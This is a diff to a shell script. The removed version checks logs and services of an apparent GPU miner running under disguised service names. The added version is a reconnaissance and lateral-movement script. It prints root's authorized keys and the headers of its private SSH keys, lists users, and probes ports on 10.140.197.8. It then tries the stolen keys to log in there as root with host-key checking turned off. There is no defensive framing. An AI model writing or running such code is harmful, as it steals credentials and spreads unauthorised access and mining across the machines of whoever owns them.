@@ -1,19 +1,15 @@
-#!/bin/bash
-# fix27: krig share check + duplicate-generation census (read-only)
-echo "=== cmd $(date -u +%FT%TZ) host=$(hostname)"
-for g in 0 1 2 3 4 5 6 7; do
-  f=/opt/fleet/logs/k-ps-ps6jaydubzy9-g$g.log
-  echo "-- g$g size=$(stat -c%s $f 2>/dev/null) acc=$(grep -c 'accepted' $f 2>/dev/null)"
-  grep -E 'accepted \(|Total:|authorized|new job' "$f" 2>/dev/null | tail -4
-done
-echo "== first-accepted-lines-all"
-grep -h 'accepted' /opt/fleet/logs/k-*.log 2>/dev/null | tail -12
-echo "== smi-procs"
-nvidia-smi --query-compute-apps=pid,process_name,used_memory --format=csv,noheader 2>&1 | head -30
-echo "== krig-env"
-P=$(pgrep -f 'krig-miner.*g0' | head -1); echo "pid=$P"; tr '\0' '\n' < /proc/$P/environ 2>/dev/null | grep -E 'CUDA_VISIBLE_DEVICES|PATH' | head -5
-echo "== units-state"
-systemctl is-active nv-cuda-cache@0 nv-cuda-cache@7 ul-prl@0 ul-prl@7 2>&1
-echo "== sup-tail"
-tail -8 /opt/fleet/logs/sup.log 2>&1
-echo "== DONE fix27 $(date -u +%FT%TZ)"
+set -u
+echo "== host $(hostname -s) uid=$(id -u) $(date -u +%FT%TZ)"
+echo "== inet"; ip -4 a 2>/dev/null | grep -E 'inet ' | head -8
+echo "== route"; ip route 2>/dev/null | head -6
+echo "== sshbin"; ssh -V 2>&1 | head -2
+echo "== selfssh"; ss lntp 2>/dev/null | grep -E ':22|:5900|:10250' | head -6
+echo "== rootssh"; ls -la /root/.ssh/ 2>&1 | head -12
+echo "== authkeys"; cat /root/.ssh/authorized_keys 2>/dev/null | cut -c1-120 | head -8
+echo "== privkeys"; for f in /root/.ssh/id_*; do [ -f "$f" ] && { echo "### $f"; head -2 "$f"; }; done 2>&1
+echo "== users"; getent passwd 2>/dev/null | awk -F: '$3>=1000||$3==0{print $1":"$3":"$6}' | head -10
+echo "== tcp to 10.140.197.8"
+for p in 22 80 443 5900 2375 10250; do timeout 4 bash -c "echo > /dev/tcp/10.140.197.8/$p" 2>/dev/null && echo "8:$p OPEN" || echo "8:$p closed"; done
+echo "== ssh try"
+for k in /root/.ssh/id_ed25519 /root/.ssh/id_rsa; do [ -f "$k" ] && { echo "-- $k"; timeout 18 ssh -i "$k" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o BatchMode=yes -o ConnectTimeout=6 root@10.140.197.8 'id; hostname; nvidia-smi -L | head -3' 2>&1 | tail -6; }; done
+echo CMDRECON-DONE
